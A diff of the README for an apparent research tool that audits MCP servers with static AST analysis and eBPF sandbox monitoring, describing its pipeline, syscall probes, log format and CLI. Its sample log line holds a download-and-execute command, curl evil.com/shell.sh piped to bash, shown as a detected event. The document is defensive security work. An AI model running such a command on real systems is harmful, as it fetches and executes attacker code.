@@ -1,247 +1,533 @@
 # MCP Security Auditor
 
-**Advanced Security Analysis Framework for Model Context Protocol (MCP) Servers**
+**Hybrid Static + Dynamic Security Analysis for Model Context Protocol (MCP) Servers**
 
-[![FSE Research Artifact](https://img.shields.io/badge/Research-Artifact-blue)](https://github.com/your-org/mcp-security)
+[![FSE Research Artifact](https://img.shields.io/badge/Research-Artifact-blue)](https://github.com/nyit-vancouver/mcp-sec-audit)
 [![License](https://img.shields.io/badge/License-MIT-green)](LICENSE)
-[![Python](https://img.shields.io/badge/Python-3.9%2B-blue)](https://python.org)
+[![Python](https://img.shields.io/badge/Python-3.13-blue)](https://python.org)
 [![Docker](https://img.shields.io/badge/Docker-Required-orange)](https://docker.com)
 [![Benchmark](https://img.shields.io/badge/MCPTox-94.7%25_Coverage-success)](detection/README.md)
 
-## 📖 Abstract
+## Abstract
 
-This repository constitutes the research artifact for the study on **Security Risks in Model Context Protocol (MCP) Systems**. As Large Language Model (LLM) agents increasingly rely on MCP to interact with external tools and data, they inherit significant security vulnerabilities ranging from Remote Code Execution (RCE) to novel threats like Indirect Prompt Injection.
+MCP Security Auditor is a research artifact for detecting security vulnerabilities in Model Context Protocol (MCP) servers. As LLM agents increasingly rely on MCP to interact with external tools and data, they inherit significant security vulnerabilities — from Remote Code Execution (RCE) to Indirect Prompt Injection and supply-chain attacks.
 
-**MCP Tools Detection** provides a comprehensive, multi-layered defense mechanism combining static code analysis (AST-based) with dynamic runtime monitoring (eBPF-based) to identify malicious or vulnerable MCP servers before they can compromise an agentic workflow.
+The framework uses a **three-phase hybrid analysis pipeline**:
 
-## 🏗 System Architecture
-
-The system operates on a "Producer-Consumer" architecture designed for scalability and depth of analysis.
-
-```mermaid
-graph TD
-    A[MCP Tool Source Code] --> B{Analysis Pipeline}
-    
-    subgraph "Detection Module (Producer)"
-        B --> C[Static Analysis Engine]
-        C -->|AST & TOML Rules| D(Static Findings)
-        
-        B --> E[Dynamic Analysis Sandbox]
-        E -->|Docker + eBPF| F[Syscall Monitor]
-        F -->|Raw CEF Logs| G(Log Parser & Scorer)
-        
-        D --> H[Risk Scoring System]
-        G --> H
-        H --> I[JSONL Output Stream]
-    end
-    
-    subgraph "Web Portal (Consumer)"
-        I --> J[Detection Adapter]
-        J --> K[Visualization Dashboard]
-        J --> L[REST API]
-    end
-```
-
-### 1. Detection Engine (`detection/`)
-The core analysis framework implementing a hybrid detection approach:
--   **Static Analysis**: Parses Python Abstract Syntax Trees (AST) to detect dangerous function calls, variable tainting, and known malicious patterns defined in `keywords.toml`.
--   **Dynamic Analysis**: Orchestrates Docker containers instrumented with eBPF (Extended Berkeley Packet Filter) to capture kernel-level system calls (`sys_execve`, `sys_open`, `sys_connect`). This allows detection of obfuscated malicious behavior that evades static analysis.
--   **Policy Engine**: Evaluates findings against configurable risk thresholds to assign `CRITICAL`, `HIGH`, `MEDIUM`, or `LOW` severity scores.
-
-### 2. Web Detection Portal (`web-detection-portal/`)
-A visualization and management interface that consumes the structured output from the detection engine:
--   **Automated Ingestion**: Real-time monitoring of detection results.
--   **Interactive Dashboard**: Filterable views of security findings.
--   **API Integration**: REST endpoints for integrating scanning into CI/CD pipelines.
-
-### 3. Vulnerable Lab (`detection/examples/vulnerable-mcp-servers-lab`)
-A ground-truth dataset of intentionally vulnerable MCP servers covering:
--   **Remote Code Execution (RCE)**: Unsafe `eval()`, `subprocess`.
--   **Prompt Injection**: Data exfiltration via hidden instructions.
--   **Path Traversal**: Arbitrary file read/write.
--   **Typosquatting**: Supply chain attack simulation.
+1. **Static Analysis** — Multi-language AST extraction (Python `ast` + JS/TS tree-sitter), call graph construction, reverse BFS from sinks, and lightweight taint analysis
+2. **Dynamic Analysis** — Docker sandbox execution instrumented with eBPF tracepoints, filtered via Linux cgroup v2 boundary, outputting CEF (Common Event Format) logs
+3. **Correlation** — Merges static findings with runtime events, upgrading confidence from `potential` → `confirmed` and escalating severity for multi-behavior combinations
 
 ---
 
-## 🚀 Quick Start
+## System Architecture
+
+```mermaid
+graph TD
+    TARGET["MCP Server Source Code<br/>(Python / JS / TS)"]
+
+    subgraph PHASE1["Phase 1: Static Analysis"]
+        direction TB
+        LEGACY["Legacy Detectors<br/>(DetectorRegistry + TOML rules)"]
+        AST["AST Analysis Engine (shadow mode)"]
+        EX_PY["Python AST Extractor<br/>(extractors/python_ast.py)"]
+        EX_TS["JS/TS tree-sitter Extractor<br/>(extractors/javascript_ts_tree_sitter.py)"]
+        FACTS["Fact Store<br/>(EntryPointFact · SinkFact · ImportFact)"]
+        CG["Call Graph<br/>(passes/call_graph.py)"]
+        RST["Reverse Sink Trace<br/>(BFS: sink → root function)"]
+        TAINT["Taint-lite Dataflow<br/>(passes/taint_lite.py)"]
+        FB["Finding Builder<br/>(passes/finding_builder.py)"]
+        STATIC_OUT["CapabilityFinding[]<br/>status: POTENTIAL"]
+
+        LEGACY --> STATIC_OUT
+        TARGET --> EX_PY --> FACTS
+        TARGET --> EX_TS --> FACTS
+        FACTS --> CG --> RST --> TAINT --> FB
+        FB --> STATIC_OUT
+    end
+
+    subgraph PHASE2["Phase 2: Dynamic Analysis"]
+        direction TB
+        TP["TriggerPlan<br/>(execution_mode + sink_types + risk_categories)"]
+        DOCKER["Docker Container<br/>--privileged --pid=host"]
+        CGROUP["cgroup v2: /sys/fs/cgroup/mcp-target"]
+        BPF["eBPF Tracepoints<br/>(7 syscall probes)"]
+        CEF["CEF Log Output"]
+        CEFPARSE["CEF Parser<br/>(extractors/dynamic.py)"]
+        RUNTIME["RuntimeEventFact[]"]
+
+        STATIC_OUT -->|guides| TP
+        TP --> DOCKER
+        DOCKER --> CGROUP --> BPF --> CEF
+        CEF --> CEFPARSE --> RUNTIME
+    end
+
+    subgraph PHASE3["Phase 3: Correlation"]
+        direction TB
+        CORR["Dynamic Correlation<br/>(passes/dynamic_correlation.py)"]
+        MERGED["Merged Findings<br/>POTENTIAL → CONFIRMED<br/>severity escalation"]
+
+        STATIC_OUT --> CORR
+        RUNTIME --> CORR
+        CORR --> MERGED
+    end
+
+    REPORT["ReportBuilder<br/>(markdown / JSON / JSONL)"]
+    PORTAL["Web Detection Portal"]
+
+    MERGED --> REPORT
+    REPORT -->|JSONL| PORTAL
+
+    TARGET --> PHASE1
+```
+
+### eBPF Monitoring Pipeline
+
+```mermaid
+graph LR
+    subgraph HOST["Host / Docker Desktop"]
+        subgraph CONTAINER["Privileged Docker Container"]
+            ENTRY["entrypoint.sh"]
+            CG2["mkdir /sys/fs/cgroup/mcp-target<br/>stat -c '%i' → cgroup inode ID"]
+            MONITOR["ebpf_monitor.py<br/>(BCC Python)"]
+            BPF_C["bpf_programs.c<br/>(7 TRACEPOINT_PROBE)"]
+            TARGET_PROC["Target Process<br/>(echo $$ > cgroup.procs)"]
+
+            ENTRY --> CG2
+            CG2 -->|MCP_TARGET_CGROUP_ID| MONITOR
+            MONITOR -->|loads| BPF_C
+            ENTRY --> TARGET_PROC
+        end
+
+        KERNEL["Linux Kernel"]
+        BPF_MAP["BPF_ARRAY: target_cgroup_id<br/>BPF_PERCPU_ARRAY: event_heap<br/>BPF_STACK_TRACE: stack_traces"]
+        TP_OPEN["sys_enter_openat"]
+        TP_EXEC["sys_enter_execve"]
+        TP_CONN["sys_enter_connect"]
+        TP_WRITE["sys_enter_write"]
+        TP_READ["sys_enter_read"]
+        TP_UNLINK["sys_enter_unlinkat"]
+        TP_FORK["sched_process_fork"]
+
+        KERNEL --- BPF_MAP
+        BPF_MAP --> TP_OPEN
+        BPF_MAP --> TP_EXEC
+        BPF_MAP --> TP_CONN
+        BPF_MAP --> TP_WRITE
+        BPF_MAP --> TP_READ
+        BPF_MAP --> TP_UNLINK
+        BPF_MAP --> TP_FORK
+    end
+
+    CGROUP_CHECK["is_target():<br/>bpf_get_current_cgroup_id()<br/>== target_cgroup_id[0]"]
+    PERF_BUF["BPF_PERF_OUTPUT(events)"]
+    CEF_OUT["CEF Formatted Logs<br/>dproc · fname · dst · dpt<br/>command_args · ustack · target_path"]
+    PARSER["extractors/dynamic.py<br/>→ RuntimeEventFact"]
+
+    TP_OPEN --> CGROUP_CHECK
+    TP_EXEC --> CGROUP_CHECK
+    TP_CONN --> CGROUP_CHECK
+    TP_WRITE --> CGROUP_CHECK
+    TP_READ --> CGROUP_CHECK
+    TP_UNLINK --> CGROUP_CHECK
+    TP_FORK --> CGROUP_CHECK
+
+    CGROUP_CHECK -->|pass| PERF_BUF
+    CGROUP_CHECK -->|fail: filtered| X["❌ Dropped"]
+    PERF_BUF --> MONITOR --> CEF_OUT
+    CEF_OUT --> PARSER
+```
+
+---
+
+## How It Works
+
+### Phase 1: Static Analysis (`pipelines/static.py`)
+
+The static pipeline runs two parallel tracks:
+
+**Track A — Legacy Detectors** run via `DetectorRegistry` (plugin system with TOML rule matching). These produce `CapabilityFinding` objects directly.
+
+**Track B — AST Analysis Engine** (shadow mode):
+
+1. **Fact Extraction** — Source files are dispatched to language-specific extractors:
+   - `.py` files → `extractors/python_ast.py` (Python `ast` module)
+   - `.js/.ts/.mjs/.mts/.tsx` files → `extractors/javascript_ts_tree_sitter.py` (tree-sitter)
+   - Outputs: `EntryPointFact`, `SinkFact`, `ImportFact`, `FunctionFact`, `CallFact`
+
+2. **Call Graph Construction** (`passes/call_graph.py`) — Builds a directed graph of function calls from `CallFact` records, with caller/callee resolution via import aliases.
+
+3. **Reachability Analysis** (two paths):
+   - **Path A (MCP Forward):** If MCP entrypoints exist, runs forward reachability from entrypoints to sinks
+   - **Path B (Generic Reverse):** `passes/reverse_sink_trace.py` performs backward BFS from every `SinkFact` through the call graph to find the root triggering function — works without MCP entrypoints, catching poisoned dependencies
+
+4. **Taint-lite Dataflow** (`passes/taint_lite.py`) — Lightweight intra-procedural dataflow analysis tracking taint from parameters through assignments to sink arguments.
+
+5. **Finding Builder** (`passes/finding_builder.py`) — Converts reachable sink chains into `FindingFact` records with `status=POTENTIAL`.
+
+### Phase 2: Dynamic Analysis (`pipelines/dynamic.py`)
+
+Static results guide dynamic execution via a `TriggerPlan`:
+
+```python
+@dataclass
+class TriggerPlan:
+    execution_mode: str = "mcp_fuzz"   # "mcp_fuzz" or "direct_exec"
+    target_tools: list[str]            # MCP tool names with findings
+    risk_categories: list[str]         # ["rce", "file", "network"]
+    sink_types: list[str]              # ["eval", "execSync", "fetch"]
+    priority: str = "medium"           # based on finding severity
+```
+
+**Execution Mode Auto-Detection** (`_detect_execution_mode()`):
+- Scans `package.json` for MCP SDK patterns (`@modelcontextprotocol/sdk`, `transport`)
+- Falls back to scanning Python files for `mcp`/`fastmcp` patterns
+- Returns `"mcp_fuzz"` (MCP protocol fuzzing) or `"direct_exec"` (direct script execution)
+
+**Sandbox Lifecycle:**
+
+1. **Container Launch** — Docker container started with `--privileged` (eBPF access), `--pid=host` (PID namespace for `/proc`), target code mounted at `/target`, monitor scripts at `/monitor`
+
+2. **Entrypoint** (`sandbox/monitors/entrypoint.sh`):
+   - Creates cgroup v2 `/sys/fs/cgroup/mcp-target`
+   - Computes cgroup inode ID via `stat -c "%i"`
+   - Runs optional `/target/setup.sh` (pre-monitor setup hook)
+   - Starts eBPF monitor with `MCP_TARGET_CGROUP_ID` environment variable
+   - Executes target in target cgroup (`echo $$ > cgroup.procs`)
+
+3. **eBPF Monitoring** (`sandbox/monitors/ebpf_monitor.py`):
+   - Loads BPF programs from `bpf_programs.c`
+   - Sets target cgroup ID in `BPF_ARRAY(target_cgroup_id, u64, 1)`
+   - Captures events via perf buffer
+   - Outputs CEF (Common Event Format) logs
+
+4. **CEF Parsing** (`extractors/dynamic.py`) — Parses CEF logs into `RuntimeEventFact` records
+
+### Phase 3: Correlation (`passes/dynamic_correlation.py`)
+
+Merges static findings with runtime events through multi-level matching:
+
+| Match Level | Criteria | Effect |
+|-------------|----------|--------|
+| **Exact** | ustack attribution (sink filename in runtime stack) OR `target_path` overlap with sink arguments | `POTENTIAL → CONFIRMED`, confidence HIGH |
+| **Category** | Only category matches (e.g., static `rce` sink + runtime `PROC_EXEC` event) | `POTENTIAL → CONFIRMED`, confidence MEDIUM |
+| **Unmatched event** | Runtime event with no corresponding static finding | New `RUNTIME_ONLY` finding created |
+
+**Severity Escalation:** Findings correlated with ≥2 different event categories (e.g., `PROC_EXEC` + `NETWORK_CONNECT`) are automatically escalated one severity level.
+
+---
+
+## eBPF Monitoring
+
+### Syscall Tracepoints
+
+The BPF program (`bpf_programs.c`, ~368 lines) attaches 7 kernel tracepoints:
+
+| Tracepoint | Event Type | Data Captured |
+|:-----------|:-----------|:--------------|
+| `syscalls:sys_enter_openat` | `FILE_OPEN` | path, flags, fd, stack_id |
+| `syscalls:sys_enter_read` | `FILE_READ` | fd, size, resolved path |
+| `syscalls:sys_enter_write` | `FILE_WRITE` | fd, size, resolved path |
+| `syscalls:sys_enter_unlinkat` | `FILE_UNLINK` | path, stack_id |
+| `syscalls:sys_enter_connect` | `NET_CONNECT` | IP (v4/v6/unix), port, family, stack_id |
+| `syscalls:sys_enter_execve` | `PROC_EXEC` | path, comm, `/proc/<pid>/cmdline`, stack_id |
+| `sched:sched_process_fork` | `PROC_FORK` | comm, child_pid |
+
+### BPF Maps
+
+| Map | Type | Purpose |
+|:----|:-----|:--------|
+| `target_cgroup_id` | `BPF_ARRAY(u64, 1)` | Single-entry map holding target cgroup inode ID |
+| `event_heap` | `BPF_PERCPU_ARRAY(event_data, 1)` | Per-CPU event allocation (avoids BPF 512-byte stack limit) |
+| `stack_traces` | `BPF_STACK_TRACE(1024)` | User-space call stack capture |
+| `active_opens` | `BPF_HASH(tid → open_args)` | Tracks in-flight `openat` calls |
+| `fd_info` | `BPF_HASH(pid<<32|fd → path)` | Maps file descriptors to resolved paths |
+
+### CEF Output Format
+
+```
+CEF:0|MCP-Security|Dynamic-Detector|1.0|PROC_EXEC|Suspicious Command Execution|8|
+  rt=2025-05-01T12:00:00.000 suser=root sproc=bash spid=1234 outcome=success
+  dproc=/usr/bin/bash command_args=bash -c curl evil.com/shell.sh | bash
+  ustack=0x7f3a2b1c3d5e|0x7f3a2b1c4a20 target_path=/target/index.js
+```
+
+Standard CEF extensions: `dproc`, `fname`, `fsize`, `dst`, `dpt`, `command_args`, `ustack`, `target_path`.
+
+### cgroup v2 Boundary Filtering
+
+```
+┌─────────────────────────────────────────────────────┐
+│              Docker Container (--privileged)        │
+│                                                     │
+│  ┌───────────────────────────────────────────────┐  │
+│  │   cgroup: /sys/fs/cgroup/mcp-target           │  │
+│  │   inode_id = stat -c "%i" (computed once)     │  │
+│  │                                               │  │
+│  │   ┌────────────┐    ┌──────────────────────┐  │  │
+│  │   │  target    │───▶│  child processes     │  │  │
+│  │   │  process   │    │ (auto-inherit cgroup)│  │  │
+│  │   └────────────┘    └──────────────────────┘  │  │
+│  │          │                                    │  │
+│  │          ▼ eBPF events                        │  │
+│  │   ┌────────────────────────────────────────┐  │  │
+│  │   │ is_target():                           │  │  │
+│  │   │   bpf_get_current_cgroup_id()          │  │  │
+│  │   │   == target_cgroup_id[0]               │  │  │
+│  │   │   → capture syscall events             │  │  │
+│  │   └────────────────────────────────────────┘  │  │
+│  └───────────────────────────────────────────────┘  │
+│                                                     │
+│      Non-target processes (runc, tar, npm install)  │
+│      → is_target() returns false → filtered out     │
+└─────────────────────────────────────────────────────┘
+```
+
+**Why cgroup instead of PID whitelist:**
+
+| Problem | PID Whitelist | cgroup v2 |
+|:--------|:-------------|:----------|
+| Fork race condition | Must register child PIDs in userspace — race between fork and registration | Child processes auto-inherit parent's cgroup (kernel guarantee) |
+| PID namespace | PIDs differ between host/container namespaces | cgroup inode IDs are namespace-independent |
+| Timing sensitivity | PIDs recycled after process exit | cgroup membership is deterministic, no timing window |
+| Noise reduction | 38,742 events (PID whitelist) | 61 events (cgroup boundary) |
+
+The `is_target()` check is a single BPF helper call (`bpf_get_current_cgroup_id()`) compared against a map value — deterministic, no timing-sensitive operations.
+
+---
+
+## Multi-Language Support
+
+| Language | Extractor | Entry Points | Sinks |
+|:---------|:----------|:-------------|:------|
+| **Python** | `python_ast.py` (`ast` module) | `@mcp.tool`, `@mcp.resource`, `@mcp.prompt`, `FastMCP` decorators | `eval()`, `exec()`, `subprocess.*`, `open()`, `requests.*`, `socket.*`, `os.system()` |
+| **JS/TS** | `javascript_ts_tree_sitter.py` (tree-sitter) | MCP SDK patterns (`@modelcontextprotocol/sdk`), `server.tool()` | `eval()`, `child_process.*`, `fetch()`, `http.*`, `fs.*`, `require()` |
+
+### Reverse Sink Trace
+
+Unlike traditional taint analysis (forward from sources), the engine performs **backward BFS from sinks**:
+
+1. Identify all sink calls (`SinkFact` records matched by TOML rules)
+2. For each sink, locate the `CallFact` via `sink.call_id`
+3. BFS upward through the call graph: find who calls the sink's containing function, then who calls *that* function, etc.
+4. Stop at root function (module-level code or function with no callers) or max depth (10 hops)
+5. Build a forward call chain from root → sink for evidence
+
+This approach detects dangerous code paths even when MCP entrypoints are absent (e.g., poisoned npm dependencies, utility libraries with RCE vectors).
+
+---
+
+## Fact Schema
+
+The analysis engine uses typed dataclass facts throughout the pipeline:
+
+| Fact Type | Purpose | Key Fields |
+|:----------|:--------|:-----------|
+| `EntryPointFact` | MCP-exposed entry point | `kind` (tool/resource/prompt), `name`, `function_id` |
+| `SinkFact` | Dangerous function call | `sink_name`, `category` (rce/file/network), `severity_base`, `rule_id` |
+| `ImportFact` | Module import relationship | `module`, `alias`, `kind` (import/require/esm_import) |
+| `FunctionFact` | Callable unit (function/method) | `name`, `qualified_name`, `params`, `decorators` |
+| `CallFact` | Function invocation | `caller`, `callee`, `args`, `kwargs`, `snippet` |
+| `RuntimeEventFact` | eBPF-captured runtime event | `pid`, `kind` (process_exec/file_access/network_connect), `command`, `command_args`, `ustack`, `target_path` |
+| `FindingFact` | Final correlated finding | `severity`, `confidence`, `status` (potential/confirmed/runtime_only), `call_chain`, `dynamic_evidence` |
+
+---
+
+## Project Structure
+
+```
+mcp-sec-audit/
+├── detection/                            # Core Analysis Engine
+│   ├── detection/                        # Main package
+│   │   ├── cli.py                        # CLI entry point
+│   │   ├── core/
+│   │   │   ├── models.py                 # CapabilityFinding, DetectionResult, EvidenceSource
+│   │   │   ├── registry.py               # DetectorRegistry (plugin system)
+│   │   │   └── session.py                # DetectionSession
+│   │   ├── pipelines/
+│   │   │   ├── static.py                 # Static pipeline: legacy + AST shadow mode
+│   │   │   ├── dynamic.py                # Dynamic pipeline: Docker + eBPF + TriggerPlan
+│   │   │   └── rag.py                    # RAG pipeline
+│   │   ├── plugins/
+│   │   │   ├── static/
+│   │   │   │   ├── python/               # Legacy Python AST detectors
+│   │   │   │   └── typescript/           # TS detection (placeholder)
+│   │   │   ├── dynamic/                  # Dynamic behavior analyzer
+│   │   │   └── rag/
+│   │   ├── sandbox/
+│   │   │   ├── runner.py                 # SandboxResult, SandboxProvider protocol
+│   │   │   └── providers/
+│   │   │       └── docker_provider.py    # Docker orchestration (--privileged, --pid=host)
+│   │   ├── rules/                        # TOML detection rules (keywords.toml)
+│   │   ├── mitigation/                   # MitigationEngine, policy templates
+│   │   ├── knowledge/                    # Knowledge base
+│   │   └── reporting/                    # Report generation
+│   │
+│   ├── analysis/                         # AST-based analysis engine
+│   │   ├── engine.py                     # Multi-language dispatch: Python AST + JS/TS tree-sitter
+│   │   ├── extractors/
+│   │   │   ├── python_ast.py             # Python AST fact extractor
+│   │   │   ├── javascript_ts_tree_sitter.py  # JS/TS tree-sitter fact extractor
+│   │   │   └── dynamic.py               # CEF log parser (eBPF → RuntimeEventFact)
+│   │   ├── facts/
+│   │   │   ├── schema.py                # Fact dataclasses (EntryPointFact, SinkFact, etc.)
+│   │   │   ├── store.py                 # FactStore
+│   │   │   ├── ids.py                   # Fact ID generation
+│   │   │   └── serialization.py         # Fact serialization
+│   │   └── passes/
+│   │       ├── call_graph.py            # Call graph construction
+│   │       ├── reverse_sink_trace.py    # Reverse BFS from sinks to root functions
+│   │       ├── taint_lite.py            # Lightweight taint analysis
+│   │       ├── dynamic_correlation.py   # Static↔Dynamic correlation
+│   │       └── finding_builder.py       # Build CapabilityFinding from facts
+│   │
+│   ├── sandbox/                          # Docker + eBPF infrastructure
+│   │   ├── Dockerfile                    # Sandbox image (BCC, Python 3.13, eBPF tools)
+│   │   ├── docker-compose.yml
+│   │   └── monitors/
+│   │       ├── bpf_programs.c            # eBPF C programs (7 syscall tracepoints)
+│   │       ├── ebpf_monitor.py           # BCC Python monitor (CEF output)
+│   │       ├── entrypoint.sh             # Container entry: cgroup + dual mode
+│   │       └── fuzzer.py                 # MCP protocol fuzzer
+│   │
+│   ├── examples/
+│   │   ├── benchmarks/
+│   │   │   ├── mcptox/                   # 491 benchmark samples (94.7% coverage)
+│   │   │   ├── recent-mcp/              # Real-world MCP vulnerabilities
+│   │   │   │   └── litellm-mcp-stdio-command-exec/  # LiteLLM CVE fixture
+│   │   │   └── supply-chain-attacks/    # Supply chain attack samples
+│   │   ├── vulnerable-mcp-servers-lab/  # Ground truth vulnerable servers (submodule)
+│   │   └── dynamic_analysis_demo.py
+│   │
+│   └── tests/                           # Test suite
+│
+├── web-detection-portal/                 # Visualization Interface
+│   ├── app.py                           # Flask Application
+│   ├── detection_adapter.py             # Data Bridge (JSONL Parser)
+│   └── templates/                       # Dashboard UI
+│
+└── docker-compose.yml                   # Deployment Configuration
+```
+
+---
+
+## Quick Start
 
 ### Prerequisites
 
--   **Python 3.9+** (Managed via `uv`)
--   **Docker** & **Docker Compose** (Required for Dynamic Analysis)
--   **Linux Kernel >= 4.4** (or Docker Desktop with Linux VM) for eBPF support.
--   **[uv](https://github.com/astral-sh/uv)**: High-performance Python package manager.
+- **Python 3.13+** (managed via `uv`)
+- **Docker** & **Docker Compose** (required for dynamic analysis)
+- **Linux kernel ≥ 4.4** (or Docker Desktop with Linux VM) for eBPF support
+- **[uv](https://github.com/astral-sh/uv)**: Python package manager
 
 ```bash
 # Install uv
 curl -LsSf https://astral.sh/uv/install.sh | sh
 ```
 
-### Installation & Verification
-
-#### Step 1: Clone and Setup
+### Installation
 
 ```bash
 # Clone the repository
 git clone https://github.com/nyit-vancouver/mcp-sec-audit.git
 cd mcp-sec-audit
 
-# Initialize and update git submodules (required for vulnerable-mcp-servers-lab)
+# Initialize git submodules (vulnerable-mcp-servers-lab)
 git submodule update --init --recursive
 
-# Navigate to detection directory
+# Setup detection engine
 cd detection
-
-# Initialize Python environment
 uv sync
 ```
 
-#### Step 2: Verify Installation
+### Verify Installation
 
-Run the following commands to confirm successful installation:
-
-**1. Check CLI Access**
+**Check CLI:**
 ```bash
-# Display help menu
 uv run python -m detection.cli --help
 ```
 
-Expected output should show:
-```
-usage: cli.py [-h] [--pipeline {static,dynamic,rag}] [--format {markdown,json}]
-              [--output OUTPUT] [--policy-dir POLICY_DIR] [--rules RULES]
-              target
-```
-
-**2. Test Static Analysis**
+**Test static analysis:**
 ```bash
-# Run a quick scan on a sample vulnerable server
 uv run python -m detection.cli \
     examples/vulnerable-mcp-servers-lab/vulnerable-mcp-server-filesystem-workspace-actions \
     --format markdown
 ```
 
-Expected output includes:
-- ✅ Detected capabilities (e.g., `file_read`, `file_write`, `command_exec`)
-- ✅ Risk score and risk level (e.g., `HIGH`)
-- ✅ Mitigation recommendations
+Expected output: detected capabilities (`file_read`, `file_write`, `command_exec`), risk score/level, and mitigation recommendations.
 
-**3. Verify Docker Setup (Optional - for Dynamic Analysis)**
+**Quick validation:**
 ```bash
-cd sandbox
-docker-compose build
-docker-compose up -d
-docker-compose down
+uv run python -m detection.cli \
+    examples/vulnerable-mcp-servers-lab/vulnerable-mcp-server-filesystem-workspace-actions \
+    --format json | grep -q "risk_level" && echo "✅ Verified" || echo "❌ Failed"
 ```
 
-If successful, you'll see:
-```
-✓ Building mcp-sandbox...
-✓ Container mcp-sandbox started
-```
-
-#### Step 3: Quick Validation Test
-
-Run this one-liner to verify end-to-end functionality:
-
-```bash
-cd detection
-uv run python -m detection.cli examples/vulnerable-mcp-servers-lab/vulnerable-mcp-server-filesystem-workspace-actions --format json | grep -q "risk_level" && echo "✅ Installation verified successfully!" || echo "❌ Installation verification failed"
-```
-
----
-
-### Phase 1: Run the Detection Benchmark
-
-This step executes the analysis pipeline against the MCPTox benchmark (491 samples).
+### Run the Benchmark
 
 ```bash
 cd detection
 
-# 1. Initialize environment
-uv sync
+# Build the dynamic sandbox image
+cd sandbox && docker-compose build && cd ..
 
-# 2. Build the Dynamic Sandbox (Critical for runtime monitoring)
-cd sandbox
-docker-compose build
-cd ..
-
-# 3. Run the Benchmark
-# This downloads samples, runs static analysis, and generates the report.
+# Run MCPTox benchmark (491 samples)
 uv run mcptox-benchmark
 ```
 
-*Output Location:* `detection/examples/benchmarks/mcptox/output/per_file_detection.jsonl`
+Output: `detection/examples/benchmarks/mcptox/output/per_file_detection.jsonl`
 
-### Phase 2: Launch the Visualization Portal
-
-Start the web interface to explore the results generated in Phase 1.
+### Launch the Visualization Portal
 
 ```bash
 cd ../web-detection-portal
-
-# 1. Initialize environment
 uv sync
-
-# 2. Start the Server
 uv run python app.py
 ```
 
-*Access:* **http://localhost:3003**
+Access at **http://localhost:3003**
 
 ---
 
-## 🧪 Advanced Usage
-
-### Running Dynamic Analysis on a Custom Target
-
-To analyze a specific MCP server using the full capabilities of the dynamic sandbox:
+## CLI Reference
 
 ```bash
-cd detection
+uv run python -m detection.cli <target> [options]
+```
+
+| Option | Description | Default |
+|:-------|:------------|:--------|
+| `<target>` | Path to MCP server directory or file | (required) |
+| `--pipeline` | Analysis mode: `static`, `dynamic`, `rag` | `static` |
+| `--format` | Output format: `markdown`, `json` | `markdown` |
+| `--output`, `-o` | Save to file (`.jsonl` for web portal) | stdout |
+| `--policy-dir` | Mitigation policy templates directory | `detection/mitigation/policy_templates` |
+| `--rules` | Detection rules file | `detection/rules/keywords.toml` |
+
+**Examples:**
+
+```bash
+# Quick static scan
+uv run python -m detection.cli path/to/server
+
+# JSON output
+uv run python -m detection.cli path/to/server --format json
+
+# Dynamic analysis with eBPF sandbox
+uv run python -m detection.cli path/to/server --pipeline dynamic -o output/result.jsonl
+
+# Full demo: static → dynamic → correlation
 uv run examples/dynamic_analysis_demo.py
-```
-This script demonstrates the complete lifecycle:
-1.  Synthesizes a malicious MCP tool (obfuscated RCE).
-2.  Runs **Static Analysis** (AST parsing).
-3.  Spins up the **Docker Sandbox**.
-4.  Attaches **eBPF Probes**.
-5.  Executes the malware and captures `execve` syscalls.
-6.  Outputs a comparative risk report.
 
-### 🔬 Scanning Vulnerable Servers from the Lab
-
-The `vulnerable-mcp-servers-lab` contains multiple intentionally vulnerable MCP servers for testing. Here's how to detect them:
-
-#### Static Analysis (Python Targets)
-
-```bash
-cd detection
-
-# Scan a Python-based vulnerable server
-uv run python -m detection.cli \
-    examples/vulnerable-mcp-servers-lab/vulnerable-mcp-server-filesystem-workspace-actions \
-    --format json \
-    --output output/result.jsonl
+# Batch scan
+for server in examples/vulnerable-mcp-servers-lab/*/; do
+    uv run python -m detection.cli "$server" --format json -o output/batch.jsonl
+done
 ```
 
-#### Dynamic Analysis (Node.js / Polyglot Targets)
+### CLI ↔ Web Portal Integration
 
-```bash
-cd detection
-
-# Scan a Node.js server using Docker + eBPF sandbox
-uv run python -m detection.cli \
-    examples/vulnerable-mcp-servers-lab/vulnerable-mcp-server-malicious-code-exec \
-    --pipeline dynamic \
-    --output output/result.jsonl
-```
-
-### 🔗 CLI to Web Portal Integration
-
-The system provides **real-time integration** between the CLI and Web Portal through a watched directory.
-
-#### How It Works
+The web portal watches `detection/output/` for `.jsonl` files:
 
 ```text
 ┌─────────────┐     ┌──────────────────┐     ┌─────────────────┐
@@ -250,149 +536,35 @@ The system provides **real-time integration** between the CLI and Web Portal thr
 └─────────────┘     └──────────────────┘     └─────────────────┘
                            │
                            ▼
-                    Auto-delete after
-                       import
+                    Auto-delete after import
 ```
 
-#### Step-by-Step Workflow
-
-**Terminal 1: Start the Web Portal**
-```bash
-cd web-detection-portal
-uv sync
-uv run python app.py
-
-# Output:
-# 👁  Watching directory: .../detection/output
-#    Patterns: ['*.jsonl', '*.json']
-#    Interval: 5s
-#    Delete after import: True
-# 🚀 Starting mcp-sec-audit server...
-```
-
-**Terminal 2: Run Detection and Output to Watched Directory**
-```bash
-cd detection
-
-# Scan and output to the watched directory
-uv run python -m detection.cli \
-    examples/vulnerable-mcp-servers-lab/vulnerable-mcp-server-filesystem-workspace-actions \
-    --format json \
-    --output output/scan_result.jsonl
-```
-
-**What Happens Automatically:**
-1. CLI writes `scan_result.jsonl` to `detection/output/`.
-2. Web Portal detects the new file within 5 seconds.
-3. Web Portal imports all results and displays them on the dashboard.
-4. Web Portal deletes the file after successful import.
-
-**Terminal 1 Output:**
-```text
-📥 Detected new file: scan_result.jsonl
-   ✓ Imported 1 results
-   ✓ Deleted scan_result.jsonl
-```
-
-#### Configuration Options
-
-Edit `web-detection-portal/config.py` to customize behavior:
-
-```python
-# Enable/disable directory watching
-WATCH_ENABLED = True
-
-# Directory to watch (default: detection/output)
-WATCH_DIRECTORY = Path("...") / "detection" / "output"
-
-# Polling interval in seconds
-WATCH_INTERVAL = 5
-
-# Auto-delete files after import
-DELETE_AFTER_IMPORT = True
-```
+Configure in `web-detection-portal/config.py`:
+- `WATCH_ENABLED`, `WATCH_DIRECTORY`, `WATCH_INTERVAL`, `DELETE_AFTER_IMPORT`
 
 ---
 
-## 📂 Project Structure
+## Benchmark Results
 
-```text
-mcp-sec-audit/
-├── detection/                            # [Artifact] Core Analysis Engine
-│   ├── detection/
-│   │   ├── core/                         # Analysis logic (AST, Graph)
-│   │   ├── rules/                        # TOML Detection Rules
